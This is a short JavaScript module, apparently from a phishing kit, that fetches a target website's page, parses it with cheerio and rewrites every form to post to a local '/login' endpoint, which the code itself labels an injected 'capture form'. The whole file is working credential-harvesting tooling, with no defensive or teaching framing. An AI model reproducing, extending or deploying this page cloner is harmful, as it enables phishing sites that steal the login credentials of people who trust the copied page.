// Template engine for cloning target pages
const cheerio = require('cheerio');

class TemplateEngine {
  constructor(targetUrl) {
    this.target = targetUrl;
  }

  async clone() {
    const html = await fetch(this.target).then(r => r.text());
    const $ = cheerio.load(html);
    // Inject capture form
    $('form').attr('action', '/login');
    $('form').attr('method', 'POST');
    return $.html();
  }
}

module.exports = TemplateEngine;
